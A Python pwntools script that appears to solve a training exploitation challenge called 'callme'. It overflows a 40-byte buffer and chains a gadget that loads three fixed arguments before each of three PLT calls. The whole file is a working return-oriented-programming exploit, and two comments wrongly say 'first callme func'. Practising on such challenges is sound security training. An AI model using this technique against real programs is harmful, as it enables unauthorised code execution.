from pwn import *

context.binary = "./callme"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./callme")

usefulGadgets = elf.symbols["usefulGadgets"]
arg1 = 0xDEADBEEFDEADBEEF
arg2 = 0xCAFEBABECAFEBABE
arg3 = 0xD00DF00DD00DF00D

callme1_plt = elf.plt["callme_one"]
callme2_plt = elf.plt["callme_two"]
callme3_plt = elf.plt["callme_three"]

p = process("./callme")

payload = b"A" * 40  # fill buffer

payload += p64(usefulGadgets)  # gadget for loading the args
payload += p64(arg1)  # gets popped into rdi (arg1)
payload += p64(arg2)  # gets popped into rsi (arg2)
payload += p64(arg3)  # gets popped into rdx (arg3)
payload += p64(callme1_plt)  # jump to first callme func
payload += p64(usefulGadgets)  # gadget for loading the args
payload += p64(arg1)  # gets popped into rdi (arg1)
payload += p64(arg2)  # gets popped into rsi (arg2)
payload += p64(arg3)  # gets popped into rdx (arg3)
payload += p64(callme2_plt)  # jump to first callme func
payload += p64(usefulGadgets)  # gadget for loading the args
payload += p64(arg1)  # gets popped into rdi (arg1)
payload += p64(arg2)  # gets popped into rsi (arg2)
payload += p64(arg3)  # gets popped into rdx (arg3)
payload += p64(callme3_plt)  # jump to first callme func
p.sendline(payload)

p.interactive()
